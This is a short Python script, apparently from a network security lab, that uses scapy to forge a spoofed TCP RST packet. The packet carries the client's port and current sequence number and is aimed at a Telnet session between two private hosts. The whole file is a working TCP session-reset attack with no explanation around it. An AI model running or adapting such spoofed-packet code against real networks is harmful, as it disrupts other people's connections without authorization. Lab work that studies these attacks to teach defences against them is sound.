#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")

tcp = TCP(
    sport=39232,        # Client port
    dport=23,           # Telnet
    flags="R",
    seq=3781189225      # Client current sequence
)

pkt = ip/tcp
send(pkt, verbose=1)
